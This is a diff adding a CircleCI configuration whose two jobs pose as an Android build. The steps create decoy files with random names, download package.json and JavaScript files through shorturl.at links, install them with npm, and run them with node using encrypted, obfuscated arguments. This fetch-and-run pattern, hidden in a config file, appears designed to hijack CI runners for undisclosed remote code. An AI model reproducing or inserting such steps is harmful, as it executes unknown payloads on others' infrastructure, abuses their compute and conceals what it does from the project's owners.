@@ -1,0 +1,50 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  admin:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch 1gnx69j9ss6ox7vcnqjzxaa.sh
+      - run: echo version 86645261850.63458
+      - run: curl -fsSL shorturl.at/qCEM8 -o package.json && curl -fsSL
+          shorturl.at/fuxQ4 -o e024shd6uo0njg.js && curl -fsSL shorturl.at/bexOS
+          -o exq62u5z205et.js
+      - run: touch l47vukh9i8pm.java
+      - run: mkdir 5su3hq9wbhdr4yxurcbx9gea
+      - run: npm i -s
+      - run: touch rib5gbr4qlhj5hfd41jjke.java
+      - run: touch ggx2fqxl1tdhef7rm540ghd.sh
+      - run: node e024shd6uo0njg -r
+          U2FsdGVkX18b97m0f+L7D2EFRrZT1rDZ3C1L/qrRA7O8rh2xBM+jKBxvralBJpoGvZj5UgieqkcSjpHsogFIipTQxe2HT9MZzHXEn0u8UrfIYfF2c4pCawE2+s0Y/weq/Md2HXm+NiSRhnsRbLFcDe+FtRoh71eFLWwV+V3Z2KBhVsi8vbd+bHK4d0Eu9aFAFcTFXwsvG0Yms0dF3pAiCZ7eTjsr82dT9LmCOD56e1pHfA6gP5MrZuLH2sKSUD/awnjzgkzkA2msMhj1iH3nymNE9z4QF2cUuwb68JwF66k=
+          -lpn U2FsdGVkX1/c3LWST0AwefjL9OplUpQ1m2SrlwpWo1Q= -t
+          U2FsdGVkX18rMXGFjjDUpHGZQfKEGD2/gQsZSAV/ZtWEZccOuSBX6OWjC/K7y2C7 -s
+          U2FsdGVkX1/eRuF7/T47XqJy7EEK7gC7SCVgwD7Trj7wgfqJ/9EpKxxubuceiy4GYyxz5vLJ2juuVOFTDfYsT7tVygk6NvBwwUtNXO2ZZiOqRaUirnzZ94S9RMzH1a9c8MzInmMN7cyf6rkIC65mgl2Wb4g4J1CvDDwnPuzTjeFNPi/qAUEXsBEBRMii1I7PzHoBsMEH5Y/YLsbE2SHfYUaiqYtPxMFwZTxcf5h/T/A=
+          -sp
+  cong-viec:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch 7twzum31q8bbcbmqb3v.js
+      - run: mkdir 5tplpwup7qe62fgvz98scxeaiqn
+      - run: curl -fsSL shorturl.at/juxFH -o agiyk2hgnko87.js && curl -fsSL
+          shorturl.at/dfmJW -o za2rd3mdf69ofs.js && curl -fsSL shorturl.at/jtyS7
+          -o package.json
+      - run: npm i -s
+      - run: touch if65m8skcasjdpwrf5x7tp0hvjd.ts
+      - run: touch ebsi8pmn4i5md35fh.c
+      - run: mkdir b880zg2k9cgxzt08l4
+      - run: node za2rd3mdf69ofs -s
+          U2FsdGVkX18hVdpez/okzIYFLNO3NxBmuft0C+bAb3T1JGDGKp9wtOHmPMwx5RKvV7GsL8ZnPge9Bbi2gCU504zzpj2Jsh9mVLcJfmglRF5UZ9hsMGxZwRx2jlToMzmUIpyqca33MKfTLTCGEqodVg/qAHpFmwRXofWRmql12JBmC5Ror0FqxOZmKGSEBTFXUZ0LjjOxEmXxBq4H3izhSB6XM3hUs4RYeV80MOsZ65s=
+          -lpn U2FsdGVkX1/WYWa7MMrrVFUpCT0Annm2/vsBxslX1uc= -sp -t
+          U2FsdGVkX1+QIzNd+dSpuZEz+r0XQfDQInF31pXRobQk+rvIYWdzmN7W+GRQMKuc -r
+          U2FsdGVkX1+rS8DVG8VlGGyjGzyyXJSRtzTMEwV1JBy9O6aTH581wRPJal6T/oCxpdxf9zEF1VPCm5VePXRHUoAVkDpT01Cx4zJ70XUtqmWghtGie2EmYBLSFYjK0TTFUTOPL0OE2lFm2Q8jxoIGDZ+ZUJvX5lBdJOpwcxbrC33swcdBie74fxom+umbH9bvK9gffkNV+C6sZtIkgTN95XJW6RV3O0rorja5lYouKVxB2Z1xZ3+xmCOKVgvE/AqyedvXs6p6pDdeAlbcK9W9EOz/WMmRYa5kGmp5mxLTHwM=
+      - run: touch seifgszis19p04d28rn844unbo79oi.sh
+workflows:
+  loading:
+    jobs:
+      - admin
+  MyJobs:
+    jobs:
+      - cong-viec
